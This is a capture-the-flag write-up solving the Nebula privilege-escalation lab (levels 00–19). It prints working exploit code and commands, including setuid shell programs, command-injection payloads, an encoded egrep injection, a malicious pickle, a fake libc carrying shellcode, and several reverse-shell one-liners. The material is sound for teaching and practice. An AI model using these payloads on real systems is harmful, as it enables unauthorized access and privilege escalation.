# Nebula (Exploit Education) Write-Up

## Level 00

We use `find . -user flag00 -perm -u=s 2>/dev/null` to find programs with the setuid bit. We can then just execute `/bin/…/flag00` to have a shell with `flag00`.

## Level 01

We can manipulate the `echo` program. We write a simple C program that opens up a shell:

``` c
#include <stdlib.h>

int main(int argc, char **argv, char **envp)
{
  system("/bin/bash");
}
```

We compile it in the home directory and add the path to the home directory to the `PATH` variable in the environnement. Thus when the program will search for `echo` it will launch our modified version.

## Level 02

In this level we can manipulate the `USER` env variable. Again, we use our simple C program (called `exploit`) that launches a shell. We can then set the variable using `export USER='level02 && /home/level02/exploit'`. By launching `flag02` we get a shell with user `flag02`.

## Level 03

Here, the crontab executes everything places in `/home/flag03/writable.d/` berfore deleting it. 

We first create a small C program that launches an elevated shell with the effective UID : 

```c
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv, char **envp)
{
  uid_t euid = geteuid();
  setresuid(euid, euid, euid);
  
  system("/bin/bash");
}
```

We then create a script that copies this program, makes it executable for everyone and setuid it:

```bash
#!/bin/env
cp /tmp/exploit /home/flag03/exploit
chmod +s o+x /home/flag03/exploit
```

We then put this script in `/home/flag03/writable.d/`, and then execute our program.

## Level 04

Here, the check is made on the name, so we can simply create a soft link that doesn't contain the word *token* and that points to the token, then pass it to the program, which will output its content.

## Level 05

Here, the backup at `/home/flag05/.backup/backup-19072011.tgz` can be read by anyone. By uncompressing it, we see that it contains the private key for the SSH login. By copying it to our own computer, we can use it to directly login to the `flag05` account, without any password.

## Level 06

We a simple `cat /etc/passwd | grep flag06`, we see that the encrpyted version of the password is present (rather the an `x`), which means that the password of `flag06` has been computed with the old `crypt` method. By using John The Ripper, we can easily crack it, giving the password **hello**.

## Level 07

Here, by inspecting the file `/home/flag07/thttpd.conf`, we see that a web server is running, listenning on port 7007. We can then make GET request of the form `nebula:7007/index.cgi?Host=XX`, and the `$host` variable in the Perl script will contain whatever we put in `XX` . This allows us to manipulate the shell command executed and add our own command to it.

As in [*Level 03*](#level-03), we have our *exploit* program and a script that copies it, makes it executable for everyone and setuid it. We then have to make the Perl script execute our script. We will then append `localhost && /tmp/flag07_copy_shell.sh` to the command so that a normal ping to localhost will be executed, and then our script will be runned. We just have to encode this string so that it can be placed in a GET request. The final reqeust looks like : `nebula:7007/index.cgi?Host=0%20%26%26%20%2Ftmp%2Fflag07_copy_shell.sh`. 

It remains to run our exploit program, which launches a shell as `flag07`.

## Level 08

We see that a `tcp-dump` capture is avaible at `/home/flag08/capture.pcap`. By opening it using wireshark, we see that it's the network traffic between an user and a server, where the user is trying to login. 

Using wirehsark's *Follow TCP Stream* feature, we can directly see the password in cleartext. The only difficutly is to see that the dots that wireshark is displaying (which means non-reprensentable character) are in fact *Delete* instruction. We can see this by printing the conversation in hexadecimal instead of ACII. By reconstructing what the user tried to type, we get the password **backd00Rmate**.

## Level 09

Here, the PHP source code is using the deprecated (and dangerous) [*e* modifier](https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php). We can thus prepare a simple file like this one : 

```
[email {${eval($use_me)}}]
```

Now, everything that we will pass in the `$use_me` variable (that we control using the second command line argument) will be executed as PHP code.

As in some previous levels, we create a simple program `launch_shell` that launches a shell. We then execute the following command :

```bash
/home/flag09/flag09 /home/level09/exploit_file "echo exec('cp /tmp/launch_shell /home/flag09');"
/home/flag09/flag09 /home/level09/exploit_file "echo exec('chmod +xs /home/flag09/launch_shell');"
/home/flag09/launch_shell 
```

As before, it copies our program, makes it executable by everyone and setuid it. We then just have to launch our program to get a shell as `flag09`.

## Level 10

From the man page, we can read that the `access` syscall check if we have access to the file using the real UID, whereas `open` open the file using the effective UID. We also note that after verfying the access to the file, the program tries to connect to the given IP. If the server on the target IP is not up, the program will wait a moment.

Thus, we can first create a soft link pointing to a file we have read access to, for example `/home/level10/x`. The `access` check will succesfully pass, and the program will wait on `Connecting…`. At this point we can just change the soft link so that it points to the token at `/home/flag10/token` and launch our listenning server (with a simple `nc -l 18211`). The token is then printed on the server's `stdout`.

## Level 11

That one was harder. I was first concentrated on doing an exploit using the `system()` call but I couldn't find any idea how to do this, as bash reset the effective UID to the real UID if they don't match. Thus, despite having the executable with the setuid bit set, the bash command are executed as `level11`.

I then had to get a hint from [graugans](https://gist.github.com/graugans/88e6f54c862faec8b3d4bf5789ef0dd9). I didn't catch the fact that we can use the `.ssh` folder created in the `/home/flag11` folder to get access to the machine. Indeed, the random file returned by `/home/flag11` is in fact easy to predict, as `time(NULL)` returns the time in second (which is a lot for a computer) and the PID of the program is also easy to predict. We can then create a link with the predicted name that points to `/home/flag11/.ssh/authorized_keys`, and then pass to stdin our public ssh key, as the main function just copies the input to the file. The final exploit looks like this :

```c
#define _GNU_SOURCE

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <unistd.h>

#define CL "Content-Length: "

int main(int argc, char **argv)
{
	char pubkey[] = "ssh-rsa THE_SSH_PUBKEY";
	int len = 2 * strlen(pubkey) + 1;
	int pid = getpid() + 1;
	char *path;
	char tmp[] = "/tmp";
	srandom(time(NULL));
	asprintf(&path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
			'A' + (random() % 26), '0' + (random() % 10),
			'a' + (random() % 26), 'A' + (random() % 26),
			'0' + (random() % 10), 'a' + (random() % 26));
	symlink("/home/flag11/.ssh/authorized_keys", path);
	printf("%s%d\n%s\n%s", CL, len, pubkey, pubkey);
}
```

Note that we copy our key two times as we need to have an input buffer > 1024 to go to the second branch of the `if`. 

We can then pipe the output to the program : `./exploit | /home/flag11/flag11`. Our key is then registered and we can login to the `flag11` account.

## Level 12

As we can see the two first lines of the `hash()` function execute a bash command and read the output. We can then try to inject our own command to open a [reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). On the attacker side we listen for incoming connections with `nc -l 8080`.  We then craft this special password : `something && bash -i >& /dev/tcp/localhost/8080 <&1 || echo hello2`. With this, the first command we simple output *something* and will then open up the reverse shell. On the attacker side, we get our shell, connected with `flag12`, on which we can simply run `getflag`.

## Level 13

Here, I used the [LD_PRELOAD](http://www.goldsborough.me/c/low-level/kernel/2016/08/29/16-48-53-the_-ld_preload-_trick/) trick to dynamically intervet the `getuid()` function by my own implementation. We first create our new function :

```c
#include <unistd.h>

uid_t getuid() 
{
	return 1000;
}
```

That we compile into a shared library : using `gcc -shared -fPIC -o exploit.so exploit.c`. We then correctly set the env variable with `export LD_PRELOAD=$PWD/exploit.so`.

The last trick is that if we now just run `/home/flag13/flag13`, the LD_PRELOAD variable will not be taken into account because the effective UID doesn't match the real UID (it's a security measure). We then have to get rid of the setuid permission. This can be done by launching the program using `strace -e none /home/flag13/flag13` (from the man page of strace : *Programs that use the setuid bit do not have effective user ID privileges while being traced*).

We then get our token: `your token is b7057***-****-****-****-*********c58`.

## Level 14

For this level, we can give some input to the program to guess the encryption scheme. When we try to give several times the same input (for example several times the character `a`), we quickly see the pattern : the input `aaaa` gives `abcde`, so the *n*-th character is mapped to the *n+1*-character. We can code a decryption program :

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
	int len = strlen(argv[1]);
	int i;
	for(i = 0; i < len; i++)
	{
		argv[1][i] -= i;
	}
	printf("Token is : %s\n", argv[1]);
	return 0;
}
```

Then, `./exploit $(cat /home/flag14/token)` is enough to get the token.

## Level 15

Following the advice, we see some interesting output when *strace*-ing the flag15 binary:

```bash
[...]
open("/var/tmp/flag15/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
[...]
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY) = 3
```

The binary first tries to look for the libc shared library in `/var/tmp/flag15` (in which we have write access, btw), but eventually loads it from `/lib/i386-linux-gnu/libc.so.6`. This is confirmed by reading the dynamic section in the ELF:

```bash
level15@nebula:~$ readelf -d /home/flag15/flag15 

Dynamic section at offset 0xf20 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
```

Thus, if we can manage to put a "fake" libc library here, we would be able to execute code with `flag15` permission, as the binary flag has setuid bit set.

In my first attempts, I used GDB to check which function the binary is calling, and it showed that the function `puts()` of the libc library was used, so I wanted to put my exploit in the definition of this method. However, the library cannot be loaded if the method `__libc_start_main` is not defined, thus we can directly put our exploit here. We can try to see if the linking process works with just a trivial definition. Here is our `libc.c` file :

```c
int __libc_start_main(int *(main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
	return 0;
}
```

We can compile to a shared library like this : `gcc -shared -fPIC -o /var/tmp/flag15/libc.so.6 libc.c`.

If we run the binary flag we get some errors :

```bash
./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by ./flag15)
./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
./flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
```

To get rid of the relocation error, we add a trivial definition for  `_cxa_finalize`:

```c
void __cxa_finalize(void * d)
{
	return;
}

int __libc_start_main(int *(main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
	return 0;
}
```

But we still have an error :

```bash
./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by ./flag15)
Inconsistency detected by ld.so: dl-lookup.c: 169: check_match: Assertion `version->filename == ((void *)0) || ! _dl_name_match_p (version->filename, map)' failed!
```

This comes from the fact that glibc has versionned symbols, and the binary flag is requiring a specific version of the library. As we don't have such versions in our fake library, relocation isn't loading. We can look the version of  `__libc_start_main` in the original libc library :

```bash
level15@nebula:~$ readelf -a /lib/i386-linux-gnu/libc.so.6 | grep "__libc_start_main"
  2206: 00019020   450 FUNC    GLOBAL DEFAULT   12 __libc_start_main@@GLIBC_2.0
```

We can pass some options to the linker so that it will add a default version for every symbols that is not versioned. This is done like this : `gcc -shared -fPIC -Wl,-soname,GLIBC_2.0,--default-symver -o /var/tmp/flag15/libc.so.6 libc.c`.

We now have to create the exploit. As we have replaced the libc library, it will be difficult to use all the standard C function, such as `system()`, `exec()`, and so on. To circumvent this, we can use a pre-compiled shellcode exploit that we cast as a function and execute. The final file looks like this :

```c
const char code[] = "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";

void __cxa_finalize(void * d)
{
	return;
}

int __libc_start_main(int *(main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
		int (*funct)();
		funct = (int(*)())code;
		(int)(*funct)();
		return 0;
}
```

When the binary flag is launched, the code in the `code` char array is executed. This code simply opens up a shell. We can then run `getflag` in the shell to finish the level.

## Level 16

After some tries, the following string (injected into the username) did the trick and allows to use the `egrep` command to execute arbitrary command :

```
("||$'\142\141\163\150\40\55\151\40\76\46\40\57\144\145\166\57\164\143\160\57\154\157\143\141\154\150\157\163\164\57\70\60\70\60\40\74\46\61'"
```

Here is the detailed explanation of the string, starting from the beginning:

- `("` : this allows to close the regex of the egrep, in a way that the regex is invalid. Indeed, `egrep "^("` will throw the error : `egrep: Unmatched ( or \(`.
- `||` : this allows to execute another command (it's the bash OR operator). As the previsous command failed (the `egrep`), bash will take the end of the command and execute it.
- `$'\142\141\163\150\40\55\151\40\76\46\40\57\144\145\166\57\164\143\160\57\154\157\143\141\154\150\157\163\164\57\70\60\70\60\40\74\46\61'` : this whole string is completely equivalent to the string `/tmp/launch_reverse_shell`. This equivalence comes from the fact that bash allows [ANSI C like strings](https://wiki-dev.bash-hackers.org/syntax/quoting#ansi_c_like_strings) when the string is enclosed like this : `$'string'`. With this we can put our whole string in octal notation. This way, when the perl script convert the string to uppercase, it won't have any effect as the octal notation contains only backslashes and numbers. Also, note that the script at `/tmp/launch_reverse_shell` simply opens up a reverse shell, i.e, executes the command `bash -i >& /dev/tcp/localhost/8080 <&1`.
- `"` : This is used only to have a correct bash syntax. As we have already closed the first quotation mark of the `egrep` using `("`, we now have to open a quotation mark to match the closing one of the `egrep`.

As we can see, using this particular syntax, none of the modifications done by the script (convert to uppercase + strip everything after the first space) affect our string. 

We can put this string in a crafted URL, in the username field. The final URL looks like this :

```
http://nebula:1616/index.cgi?username=("||$'\57\164\155\160\57\154\141\165\156\143\150\137\162\145\166\145\162\163\145\137\163\150\145\154\154'"
```

Just before reaching this URL, we use `netcat` to listen for incoming connection with `nc -l 8080`. We can then have a shell as user `flag16`, and `getflag` ends the level.

Bonus: note that it's possible to break the login scheme just by using `("` as username and `.*` as password ;-). However, it isn't helpful in this level...

## Level 17

We use the fact that we can trigger a call to an object with given arguments when `pickle` unpickle data. Here is our script:

```python
#!/usr/bin/env python
import pickle
import os

class PwnClass(object):
	def __reduce__(self):
		return (os.system, ("bash -i >& /dev/tcp/localhost/8080 <&1",),)

instance = PwnClass()
file_obj = open("pickle", "w")
pickle.dump(instance, file_obj)
```

This creates a file `pickle` which contain the exploit. We then open a `netcat` server on another SSH session and send the exploit to the python server using `nc localhost 10007 < pickle`. We now have a shell logged as `flag17`.

## Level 18

What we can do here is limit the maximum number of opened file of a process using `setrlimit()`, this way when the program will try to open the password, file, it will fail and the code inside the if will not be executed, which allow the `loggedin` varaible to be set. Here is the exploit : 

```c
#include <sys/time.h>
#include <sys/resource.h>
#include <unistd.h>

int main(int argc, char **argv, char **envp)
{
	struct rlimit limits;
	limits.rlim_max = 4;
	limits.rlim_cur = 4;
	setrlimit(RLIMIT_NOFILE, &limits);
	execve("/home/flag18/flag18", argv, envp);
}
```

The limit is set to 4 as there is some files that need to be opened anyway (shared libs, and so on). If we set it to 3, the program will not even start. The problem is that when library are loaded, the following events happen : the lib is opened, the content is copied in memory, and finally the file is closed. But as the file is closed, it frees a slot for a new file to be opened. This means that we have to specify a debug file to `flag18`, this way once the program is loaded it will open a new file and the limit of 4 opened files will be reached again.

Now if we launch our exploit with `./exploit -d dummy_logfile` and then type `login` and `shell`, we get the following error :

```bash
./exploit: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24
```

This happends because once again, the program has to load an extra library. But after we have log in, we can close the log file to free a slot ! Let try it : we launch the flag using `./exploit -d dummy_logfile`, type `login`, `closelog` and finally `shell`. It still gives an error :

```bash
./exploit: -d: invalid option
Usage:	./exploit [GNU long option] [option] ...
	./exploit [GNU long option] [option] script-file ...
GNU long options:
	--debug
	--debugger
	--dump-po-strings
	--dump-strings
	--help
	--init-file
	--login
	--noediting
	--noprofile
	--norc
	--posix
	--protected
	--rcfile
	--restricted
	--verbose
	--version
Shell options:
	-irsD or -c command or -O shopt_option		(invocation only)
	-abefhkmnptuvxBCHP or -o option
```

The problem is that in the flag18 binary,  `argv` is passed to `/bin/sh`, which considers `-d dummy_logfile` as an invalid option.

To circumvent this, we can craft this special command : `./exploit --debug -c getflag`. Here, `--debug` will in fact be considered as `-d ebug` by flag18 (according to the man page of `getopt`), and `-c getflag` will be ignored as `c` is not a valid option. On the other and, `--debug` is a valid `bash` option and `-c getflag` too, as this is the option to execute a bash command.

We can then launch our exploit with `./exploit --debug -c getflag`, type `login`, `closelog` and finally `shell`, and getflag will be executed as flag19.

## Level 19

The trick we can use here is to know that if a process becomes an orphan process (i.e it's parent process exits earlier), it gets adopted by the process `init`, which belongs to `root`. We can then code this exploit :

```c
#include <unistd.h>
#include <stdlib.h>

int main(int argc, char **argv, char **envp)
{
	pid_t pid = fork();
	if (pid == 0) {
		sleep(1);
		execve("/home/flag19/flag19", argv, envp);
	} else {
		exit(0);
	} 		
}
```

Here, the process is forked, and while the child process waits 1 second before starting the `flag19` binary, the parent process exits.

However, we now cannot directly run `./exploit -c getflag`, because the effective user is set to `flag19` but the real user is still `level19` so we have to code a second program (that we call `execute_getflag`), used to elevate the real UID:

```c
#define _GNU_SOURCE
#include <unistd.h>

int main(int argc, char **argv, char ** envp)
{
	setresuid(980, 980, 980);
	execve("/bin/getflag", argv, envp);	
}
```

Note that we can use `id flag19` to get its UID.

One last thing is that bash will reset the effective user ID if it's not equal to the real user ID. We can disable this behavior using the option `-p`.

We then launch our exploit using `./exploit -p -c /home/level19/execute_getflag`.